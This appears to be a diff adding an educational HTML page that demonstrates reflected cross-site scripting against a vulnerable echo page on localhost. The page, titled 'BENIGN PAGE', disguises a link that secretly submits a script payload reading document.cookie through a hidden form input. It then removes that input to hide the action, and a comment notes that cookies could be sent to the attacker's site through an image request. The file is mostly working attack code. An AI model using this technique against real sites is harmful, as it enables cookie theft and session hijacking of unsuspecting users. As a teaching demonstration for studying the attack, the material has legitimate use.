@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>BENIGN PAGE</title>
+<script type="text/javascript">
+// The hacker's first site to which an unsuspecting user is attracted. 
+// The hacker's site shows a lot of useful information and generally looks
+// very good but there is one link which is malicious.
+// The link points to a popular site (which is vulnerable).
+// The hacker wants to execute his script on the user's browser to steal cookies.
+// If there is a page on the popular site which just echoes what the user sends
+//(see index.php), then that is what the hacker needs. Again the server script
+// does not sanitise inputs.
+
+// In this page, the hyperlink is actually part of a form (which the user is not
+// aware of). 
+// On clicking the link, the default action (which is to go to the server
+// is prevented by the hacker. Instead he sends a script (which he knows the server
+// will just echo back) through the form. The script here just alerts the cookies.
+// But in reality an image can be used to send all cookies to the hacker's site.
+// Remember, making cross domain requests is a cake-walk with images.
+function sendEvilScript(event)
+{
+	//Disable the default action
+	event.preventDefault();
+	
+	//Now I will control the submission.. LOL...
+	form = document.getElementById("frm");
+	ip = document.createElement("input");
+	ip.type = "text";
+	ip.name = "usr";
+	
+	// This is the potential danger.If the user clicks on 
+	// the hyperlink, then this script will go to the server (the user
+	// has unknowingly transported the hacker's script to the server
+	// and will get it back on his own browser (see index.php)
+	hackstr = "<script type='text/javascript'>alert(document.cookie);<\/script>";
+	
+	ip.value = hackstr;
+	form.appendChild(ip);
+	
+	form.submit(); //Force submit the form with my input
+	
+	//Hacker decides..."Remove the ip element immediately" so that the
+	// user has no clue as to what happened.
+	form.removeChild(ip);
+
+}
+</script>
+</head>
+<body>
+<h2>YOU CAN GO TO SRIKANTH's SITE FROM HERE</h2>
+<form id="frm" action="http://localhost/index.php" method="GET">
+<a href="http://localhost/index.php" onclick="sendEvilScript(event)">SRIKANTH's SITE</a>
+</form>
+<h3>HAVE A WONDERFUL DAY <img src="happy-smiley.jpg"/></h3>
+</body> 
+</html>
